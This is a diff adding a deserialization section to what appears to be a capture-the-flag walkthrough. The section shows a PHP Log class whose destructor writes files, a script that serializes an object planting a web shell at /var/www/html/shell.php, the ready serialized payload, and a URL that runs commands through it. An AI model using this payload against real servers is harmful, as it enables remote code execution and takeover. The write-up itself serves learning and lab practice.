@@ -115,4 +115,42 @@ We can execute command with the payload above and this is automated in **rces.py
 <br>
 
 #### Deserialization
-In progress, didn't understand a thing 😭
+Class log in **utils.ph**p implements **__destruct** and this will leave us to RCE. This function is using file_put_contents.
+* First we create a php file with Log function which defines $f and $m and serialize it;
+* Send it to the server a POST param;
+* The \_\_destruct function will write it to the server with the name we choosen. And then we can execute it and get a reverse shell on the box.
+
+Class log:
+```php
+class Log {
+        public function __construct($f, $m) {
+            $this->f = $f;
+            $this->m = $m;
+        }
+        
+        public function __destruct() {
+            file_put_contents($this->f, $this->m, FILE_APPEND);
+        }
+    }
+```
+
+Log file:
+```php
+<?php
+class Log {
+	public $f = '/var/www/html/shell.php';
+	public $m = '<?php system($_REQUEST["cmd"]); ?>';
+	}
+	print serialize(new Log);
+?>
+```
+
+Execute this log file, get the serialized object and send it to the server.
+```
+O:3:"Log":2:{s:1:"f";s:23:"/var/www/html/shell.php";s:1:"m";s:34:"<?php system($_REQUEST["cmd"]); ?>";}
+
+# In python
+"O:3:\"Log\":2:{s:1:\"f\";s:23:\"/var/www/html/shell.php\";s:1:\"m\";s:34:\"<?php system($_REQUEST[\"cmd\"]); ?>\";}"
+```
+
+Get command execution accessing `/shell.php?cmd=id`.
